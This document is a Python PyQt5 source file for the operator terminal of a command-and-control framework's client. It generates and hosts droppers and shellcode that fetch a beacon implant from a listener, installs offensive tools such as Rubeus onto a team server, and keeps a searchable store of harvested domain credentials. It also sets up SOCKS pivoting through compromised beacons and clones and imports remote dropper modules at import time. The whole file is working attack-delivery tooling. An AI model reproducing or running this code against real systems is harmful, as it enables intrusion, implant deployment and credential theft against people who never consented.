import sys
import os
import json
import logging
from datetime import datetime
from threading import Thread, Lock, Semaphore

from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *

from grpcClient import *

from git import Repo 


#
# Dropper modules
#
try:
    import pkg_resources
    dropperModulesDir = pkg_resources.resource_filename(
        'C2Client',  
        'DropperModules' 
    )
    DropperModulesPath = pkg_resources.resource_filename(
        'C2Client',  
        'DropperModules.conf'  
    )

except ImportError:
    dropperModulesDir = os.path.join(os.path.dirname(__file__), 'DropperModules')
    DropperModulesPath = os.path.join(os.path.dirname(__file__), 'DropperModules.conf')

if not os.path.exists(dropperModulesDir):
    os.makedirs(dropperModulesDir)

with open(DropperModulesPath, "r") as file:
    repositories = file.readlines()

DropperModules = []
for repo in repositories:
    repo = repo.strip()
    repoName = repo.split('/')[-1].replace('.git', '')
    repoPath = os.path.join(dropperModulesDir, repoName)

    if not os.path.exists(repoPath):
        print(f"Cloning {repoName} in {repoPath}.")
        try:
            Repo.clone_from(repo, repoPath)
        except Exception as e:
                print(f"Failed to clone {repoName}: {e}")
    else:
        print(f"Repository {repoName} already exists in {dropperModulesDir}.")

for moduleName in os.listdir(dropperModulesDir):
    modulePath = os.path.join(dropperModulesDir, moduleName)
    
    if os.path.isdir(modulePath):
        if os.path.exists(modulePath):
            sys.path.insert(1, modulePath)
            try:
                # Dynamically import the module
                importedModule = __import__(moduleName)
                DropperModules.append(importedModule)
                print(f"Successfully imported {moduleName}")
            except ImportError as e:
                print(f"Failed to import {moduleName}: {e}")


#
# Terminal modules
#
sys.path.append(os.path.join(os.path.dirname(__file__), "TerminalModules/Batcave"))
import batcave

sys.path.append(os.path.join(os.path.dirname(__file__), "TerminalModules/Credentials"))
import credentials


#
# Log
#
try:
    import pkg_resources
    logsDir = pkg_resources.resource_filename(
        'C2Client',  
        'logs' 
    )

except ImportError:
    logsDir = os.path.join(os.path.dirname(__file__), 'logs')

if not os.path.exists(logsDir):
    os.makedirs(logsDir)


#
# Constant
#
LogFileName = "Terminal.log"
HistoryFileName = ".termHistory"

HttpType = "http"
HttpsType = "https"

GrpcGetBeaconBinaryInstruction = "getBeaconBinary"
GrpcPutIntoUploadDirInstruction = "putIntoUploadDir"
GrpcInfoListenerInstruction = "infoListener"
GrpcBatcaveUploadToolInstruction = "batcaveUpload"
GrpcSocksInstruction = "socks"

BeaconFileWindows = "Beacon.exe"
BeaconFileLinux = "Beacon"

ErrorInstruction = "Error"

HelpInstruction = "help"

SocksInstruction = "Socks"
SocksHelp = """Socks:
Socks start
Socks bind beaconHash
Socks unbind
Socks stop"""

BatcaveInstruction = "Batcave"
BatcaveHelp = """Batcave:
Install the given module locally or on the team server:
exemple:
- Batcave Install rubeus
- Batcave BundleInstall recon
- Batcave Search rec"""

DropperInstruction = "Dropper"

DropperModuleGetHelpFunction = "getHelpExploration"
DropperModuleGeneratePayloadFunction = "generatePayloadsExploration"

HostInstruction = "Host"
HostHelp="""Host:
Host upload a file on the teamserver to be downloaded by a web request from a web listener (http/https):
exemple:
- Host file hostListenerHash"""

CredentialStoreInstruction = "CredentialStore"
CredentialStoreHelp = """CredentialStore:
Handle the credential store:
exemple:
- CredentialStore get
- CredentialStore set domain username credential
- CredentialStore search something"""

GetSubInstruction = "get"
SetSubInstruction = "set"
SearchSubInstruction = "search"


def getHelpMsg():
    helpText  = HelpInstruction+"\n"
    helpText += HostInstruction+"\n"
    helpText += DropperInstruction+"\n"
    helpText += BatcaveInstruction+"\n"
    helpText += CredentialStoreInstruction+"\n"
    helpText += SocksInstruction
    return helpText

completerData = [
    (HelpInstruction,[]),
    (HostInstruction,[]),
    (DropperInstruction,[]),
    (BatcaveInstruction, [
            ("Install", []),
            ("BundleInstall", []),
            ("Search", [])
             ]),
    (CredentialStoreInstruction, [
            (GetSubInstruction, []),
            (SetSubInstruction, []),
            (SearchSubInstruction, [])
             ])
]

InfoProcessing = "Processing..." 
ErrorCmdUnknow = "Error: Command Unknown"
ErrorFileNotFound = "Error: File doesn't exist."
ErrorListener = "Error: Download listener must be of type http or https."


#
# Terminal tab implementation
#
class Terminal(QWidget):
    tabPressed = pyqtSignal()
    logFileName=""
    sem = Semaphore()

    def __init__(self, parent, grpcClient):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)

        self.grpcClient = grpcClient

        self.logFileName=LogFileName

        self.editorOutput = QPlainTextEdit()
        self.editorOutput.setFont(QFont("Courier"));
        self.editorOutput.setReadOnly(True)
        self.layout.addWidget(self.editorOutput, 8)

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)


    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)


    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)


    def printInTerminal(self, cmd, result):
        now = datetime.now()
        formater = '<p style="white-space:pre">'+'<span style="color:blue;">['+now.strftime("%Y:%m:%d %H:%M:%S").rstrip()+']</span>'+'<span style="color:red;"> [+] </span>'+'<span style="color:red;">{}</span>'+'</p>'

        self.sem.acquire()
        if cmd:
            self.editorOutput.appendHtml(formater.format(cmd))
            self.editorOutput.insertPlainText("\n")
        if result:
            self.editorOutput.insertPlainText(result)
            self.editorOutput.insertPlainText("\n")
        self.sem.release()


    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.setCursorEditorAtEnd()

        if commandLine == "":
            self.printInTerminal("", "")

        else:
            cmdHistoryFile = open(HistoryFileName, 'a')
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')
            cmdHistoryFile.close()

            logFile = open(logsDir+"/"+self.logFileName, 'a')
            logFile.write('[+] send: \"' + commandLine + '\"')
            logFile.write('\n')
            logFile.close()

            self.commandEditor.setCmdHistory()
            instructions = commandLine.split()
            if len(instructions) < 1:
                return;

            if instructions[0].lower()==HelpInstruction.lower():
                self.runHelp()
            elif instructions[0].lower()==BatcaveInstruction.lower():
                self.runBatcave(commandLine, instructions)
            elif instructions[0].lower()==HostInstruction.lower():
                self.runHost(commandLine, instructions)
            elif instructions[0].lower()==CredentialStoreInstruction.lower():
                self.runCredentialStore(commandLine, instructions)
            elif instructions[0].lower()==DropperInstruction.lower():
                self.runDropper(commandLine, instructions)
            elif instructions[0].lower()==SocksInstruction.lower():
                self.runSocks(commandLine, instructions)
            
            
            else:
                self.printInTerminal(commandLine, ErrorCmdUnknow)

        self.setCursorEditorAtEnd()


    def runHelp(self):
        self.printInTerminal(HelpInstruction, getHelpMsg())


    def runSocks(self, commandLine, instructions):
        if len(instructions) < 2:
            self.printInTerminal(commandLine, SocksHelp)
            return;

        cmd = instructions[1].lower()

        if cmd == "start" or cmd == "stop" or cmd == "unbind":

            commandTeamServer = GrpcSocksInstruction + " " + cmd
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            self.printInTerminal(commandLine, result)
            return   
            
        elif cmd == "bind":

            if len(instructions) < 3:
                self.printInTerminal(commandLine, SocksHelp)
                return;

            beaconHash = instructions[2]

            commandTeamServer = GrpcSocksInstruction + " " + cmd + " " + beaconHash
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            self.printInTerminal(commandLine, result)
        
        else:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return;

        return

    #
    # Batcave
    # 
    def runBatcave(self, commandLine, instructions):
        if len(instructions) < 3:
            self.printInTerminal(commandLine, BatcaveHelp)
            return;

        cmd = instructions[1].lower()
        batgadget = instructions[2]

        if cmd == "Install".lower():
            filePath = batcave.downloadBatGadget(batgadget)
            try:
                filename = os.path.basename(filePath)
                with open(filePath, mode='rb') as fileDesc:
                    payload = fileDesc.read()
            except IOError:
                self.printInTerminal(commandLine, ErrorFileNotFound)
                return  

            commandTeamServer = GrpcBatcaveUploadToolInstruction + " " + filename
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            self.printInTerminal(commandLine, f"Added {filename} to TeamServer Tools.")
            return    

        elif cmd == "BundleInstall".lower():

            filePathList = batcave.downloadBatBundle(batgadget)
            line = ""
            for filePath in filePathList:
                try:
                    filename = os.path.basename(filePath)
                    with open(filePath, mode='rb') as fileDesc:
                        payload = fileDesc.read()
                except IOError:
                    self.printInTerminal(commandLine, ErrorFileNotFound)
                    return  

                commandTeamServer = GrpcBatcaveUploadToolInstruction + " " + filename
                termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
                resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

                result = resultTermCommand.result
                if ErrorInstruction in result:
                    self.printInTerminal(commandLine, result)
                    return  

                line += f"Added {filename} to TeamServer Tools.\n"
            line += f"BatBundle {batgadget} successfully installed!"
            self.printInTerminal(commandLine, line)

        elif cmd == "Search".lower():
            result = batcave.searchTheBatcave(batgadget)
            self.printInTerminal(commandLine, result)
            return    

        else:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return     

    #
    # CredentialStore
    # 
    def runCredentialStore(self, commandLine, instructions):
        if len(instructions) < 2:
            self.printInTerminal(commandLine, CredentialStoreHelp)
            return;

        cmd = instructions[1].lower()

        if cmd == GetSubInstruction.lower():
            currentcredentials = json.loads(credentials.getCredentials(self.grpcClient, TeamServerApi_pb2))

            toPrint = ""
            for cred in currentcredentials:
                toPrint+=json.dumps(cred)
                toPrint+="\n"
            self.printInTerminal(commandLine, toPrint)
            
            return    

        elif cmd == SetSubInstruction.lower():
            if len(instructions) < 5:
                self.printInTerminal(commandLine, CredentialStoreHelp)
                return
            
            domain = instructions[2]
            username = instructions[3]
            credential = instructions[4]

            cred = {}
            cred["domain"] = domain
            cred["username"] = username
            cred["manual"] = credential
            credentials.addCredentials(self.grpcClient, TeamServerApi_pb2, json.dumps(cred))
            return

        elif cmd == SearchSubInstruction.lower():
            if len(instructions) < 3:
                self.printInTerminal(commandLine, CredentialStoreHelp)
                return
            
            searchPatern = instructions[2]

            currentcredentials = json.loads(credentials.getCredentials(self.grpcClient, TeamServerApi_pb2))

            toPrint = ""
            for cred in currentcredentials:
                for key, value in cred.items():
                    if searchPatern in value:
                        toPrint+=json.dumps(cred)
                        toPrint+="\n"
            self.printInTerminal(commandLine, toPrint)
            return    

        else:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return    

    #
    # Host
    # 
    def runHost(self, commandLine, instructions):
        if len(instructions) < 3:
            self.printInTerminal(commandLine, HostHelp)
            return;

        filePath = instructions[1]
        hostListenerHash = instructions[2]

        commandTeamServer = GrpcInfoListenerInstruction+" "+hostListenerHash
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0]
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            self.printInTerminal(commandLine, ErrorListener)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        # Upload the file and get the path
        try:
            filename = os.path.basename(filePath)
            with open(filePath, mode='rb') as fileDesc:
                payload = fileDesc.read()
        except IOError:
            self.printInTerminal(commandLine, ErrorFileNotFound)
            return  

        commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+hostListenerHash+" "+filename
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return  
                
        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
        self.printInTerminal(commandLine, result)


    #
    # runDropper 
    #
    def runDropper(self, commandLine, instructions):
        if len(instructions) < 2:
            availableModules = "Available dropper:\n"
            for module in DropperModules:
                availableModules += module.__name__ + "\n"
            self.printInTerminal(commandLine, availableModules)
            return;

        moduleName = instructions[1].lower()

        moduleFound = False
        for module in DropperModules:

            if moduleName == module.__name__.lower():
                moduleFound = True

                if len(instructions) < 4:
                    helpText = ""
                    getHelp = getattr(module, DropperModuleGetHelpFunction)
                    helpText += getHelp()
                    self.printInTerminal(commandLine, helpText)
                    return;
            
                listenerDownload = instructions[2]
                listenerBeacon = instructions[3]
                additionalArgss = " ".join(instructions[4:])

                self.printInTerminal(commandLine, InfoProcessing)
                thread = Thread(target = self.GenerateAndHostGeneric, args = (commandLine, moduleName, listenerDownload, listenerBeacon, additionalArgss))
                thread.start()
    
        if moduleFound == False:
            self.printInTerminal(commandLine, ErrorCmdUnknow)
            return;


    #
    # Generic dropper module
    #
    def GenerateAndHostGeneric(self, commandLine, moduleName, listenerDownload, listenerBeacon, additionalArgs):
        commandTeamServer = GrpcInfoListenerInstruction+" "+listenerDownload
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)

        logging.debug("GenerateAndHostGeneric start")

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return        

        results = result.split("\n")
        if len(results)<4:
            return

        schemeDownload = results[0].lower()
        ipDownload = results[1]
        portDownload = results[2]
        downloadPath = results[3]
        if not downloadPath:
            self.printInTerminal(commandLine, ErrorListener)
            return

        if downloadPath[0]=="/":
            downloadPath = downloadPath[1:]

        if  listenerBeacon != listenerDownload:
            commandTeamServer = GrpcInfoListenerInstruction+" "+listenerBeacon
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
            self.sem.acquire()
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
            self.sem.release()

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return   

            results = result.split("\n")
            if len(results)<4:
                return

            scheme = results[0]
            ip = results[1]
            port = results[2]
        else:
            scheme=schemeDownload
            ip=ipDownload
            port=portDownload

        targetOs = "windows"
        for module in DropperModules:
            if moduleName == module.__name__.lower():
                logging.debug("GenerateAndHostGeneric check OS for module: %s", moduleName)
                try:
                    getTargetOs = getattr(module, "getTargetOsExploration")
                    print(getTargetOs)
                    targetOs = getTargetOs()
                    print(targetOs)
                except AttributeError:
                    targetOs = "windows"

        commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+listenerBeacon+" "+targetOs
        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
        self.sem.acquire()
        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
        self.sem.release()

        result = resultTermCommand.result
        if ErrorInstruction in result:
            self.printInTerminal(commandLine, result)
            return   

        if targetOs == "windows":
            beaconFilePath = "./"+BeaconFileWindows
        else:
            beaconFilePath = "./"+BeaconFileLinux
        beaconFile = open(beaconFilePath, "wb")
        beaconFile.write(resultTermCommand.data)

        beaconArg = ip+" "+port
        if scheme==HttpType or scheme==HttpsType:
            beaconArg = beaconArg+" "+scheme

        urlDownload =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath

        logging.debug("GenerateAndHostGeneric urlDownload: %s", urlDownload)

        # Generate the payload
        droppersPath = []
        shellcodesPath = []
        cmdToRUn = ""
        for module in DropperModules:
            if moduleName == module.__name__.lower():
                logging.debug("GenerateAndHostGeneric Generate for module: %s", moduleName)
                genPayload = getattr(module, DropperModuleGeneratePayloadFunction)
                droppersPath, shellcodesPath, cmdToRUn = genPayload(beaconFilePath, beaconArg, "", urlDownload, additionalArgs.split(" "))

        # Upload the file and get the path
        for dropperPath in droppersPath:
            try:
                with open(dropperPath, mode='rb') as fileDesc:
                    payload = fileDesc.read()
            except IOError:
                self.printInTerminal(commandLine, ErrorFileNotFound)
                return  

            filename = os.path.basename(dropperPath)
            commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
            self.sem.acquire()
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
            self.sem.release()

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return  
            
        for shellcodePath in shellcodesPath:
            try:
                with open(shellcodePath, mode='rb') as fileDesc:
                    payload = fileDesc.read()
            except IOError:
                self.printInTerminal(commandLine, ErrorFileNotFound)
                return  

            filename = os.path.basename(shellcodePath)
            commandTeamServer = GrpcPutIntoUploadDirInstruction+" "+listenerDownload+" "+filename
            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
            self.sem.acquire()
            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
            self.sem.release()

            result = resultTermCommand.result
            if ErrorInstruction in result:
                self.printInTerminal(commandLine, result)
                return  
                
        result = cmdToRUn 
        self.printInTerminal(commandLine, result)


    # setCursorEditorAtEnd
    def setCursorEditorAtEnd(self):
        cursor = self.editorOutput.textCursor()
        cursor.movePosition(QTextCursor.End,)
        self.editorOutput.setTextCursor(cursor)


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()
    cmdHistory = []
    idx = 0

    def __init__(self, parent=None):
        super().__init__(parent)

        if(os.path.isfile(HistoryFileName)):
            cmdHistoryFile = open(HistoryFileName)
            self.cmdHistory = cmdHistoryFile.readlines()
            self.idx=len(self.cmdHistory)-1
            cmdHistoryFile.close()

        QShortcut(Qt.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.KeyPress and event.key() == Qt.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self):
        cmdHistoryFile = open('.termHistory')
        self.cmdHistory = cmdHistoryFile.readlines()
        self.idx=len(self.cmdHistory)-1
        cmdHistoryFile.close()

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)
